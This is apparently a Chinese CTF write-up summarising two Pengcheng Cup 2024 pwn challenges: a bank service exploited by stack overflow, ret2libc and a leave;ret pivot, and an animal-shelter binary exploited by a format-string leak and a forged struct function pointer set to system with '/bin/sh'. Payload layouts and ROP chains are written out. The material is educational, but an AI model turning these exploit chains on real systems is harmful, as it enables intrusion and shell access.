---
title: web选手入门pwn(29) 鹏城杯
contest: 鹏城杯
year: 2024
difficulty: medium
vuln_type: pwn_unknown
tags: [ret2libc, struct-func-ptr, leave-ret-pivot, format-string-leak, gets-overflow]
attack_chain: 题目1(bank) send A*20 触发栈溢出 → sendlineafter(you?) sendlineafter(withdraw?) 走业务/finish payload = p64(got_write)+A*0x50+p64(0x4010D0) 让 ROP 回到 start 重入/finish payload = p64(got_write)+ret+pop_rdi(binsh)+system+...+p64(stack_addr-360)+leave/题目2(animals) ptr_obj.state+name+attr+desc+func/写3个动物ptr: bird.func=start让其执行start泄露canary(%23$p)/写bird.func=system+cat.name=/bin/sh+dog call func调用
key_payload: 题目1 leave; ret 让 rsp 跳到 0x55555555b700 (即栈上我们布置的 ROP 区)  题目2 bird.func=system + cat.name="/bin/sh\x00" + dog 触发 func
one_liner: 鹏城杯两题：银行系统栈溢出 + ROP/leave 跳板 + 函数指针伪造调用。
lesson: leave; ret 跳板把 rsp 跳到已知地址（提前布置 ROP 的位置）；结构体 func 字段是经典的"伪函数指针"目标，先把 name 写成 "/bin/sh" 再改 func=system 即可 shell。
quality: high
---

# web选手入门pwn(29) 鹏城杯

## 题目1: 银行系统 (bank)
- 业务流：发"名字" (20 字节) → choice=1 → 提款金额 → "are you sure?" 接受任意输入 → choice=0 → 存款金额
- **栈溢出点**：第一次 send 后 0x88 字节 padding + p64(vuln) 让返回地址回到 vuln 函数
- **业务循环利用**：第二次 send `B*40 + pop_rdi + got_write + puts_plt + exit_plt` 泄 write@got
- **重新对齐栈**：发送 `p64(got_write) + A*0x50 + p64(0x4010D0)` 让 ROP 回到 start 函数
- **完整 ROP 链**：
  - `p64(got_write) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system) + "A"*40 + p64(stack_addr - 360) + p64(leave)`
  - leave; ret 把 rsp 跳到 stack_addr-360（之前已写入的 ROP 区域）

## 题目2: 动物收容所 (animals)
- 结构体定义：
  ```c
  struct ptr_obj {
      int state;
      char pad0[4];
      char name[32];
      int attr1, attr2;
      char desc[32];
      void (*__fastcall *func)(char*);
  };
  ```
- **三只动物**：
  - 1=dog（基地址 0x555555555642）
  - 2=cat（基地址 0x55555555580b）
  - 3=bird（基地址 0x555555555997）
  - 全局 ptr 区 0x55555555b2a0
- **首次泄 text base**：`recvuntil("2c9")[-12:]` 取 12 字符解析为 text 段地址，减去偏移 0x12c9
- **伪造函数指针攻击**：
  - bird 操作：把 ptr->func 改写为 start（text+0x11e0）
  - cat 操作：把 ptr->name 写成 `%23$p`，触发 fmt 自动泄露 libc 地址
  - dog 操作：调用 ptr->func(start)，start 内部又走一次 fmt 输出 → 泄 base_libc
- **最终攻击**：
  - bird: ptr->func = system
  - cat: ptr->name = "/bin/sh\x00"
  - dog: call ptr->func → system("/bin/sh")

## 经验提炼
- 伪造结构体函数指针 + 把参数字符串一并写在结构体内是常见 web→pwn 题目套路
- "%23$p" 触发的 fmt 通常发生在 puts/sprintf 等操作结构体 name 字段的代码路径
- 银行系统的"业务循环"模式可以反复触发漏洞点，但每次栈布局变化需要 p64(start) 重新对齐
- leave; ret 跳板需要先泄栈地址才能定向
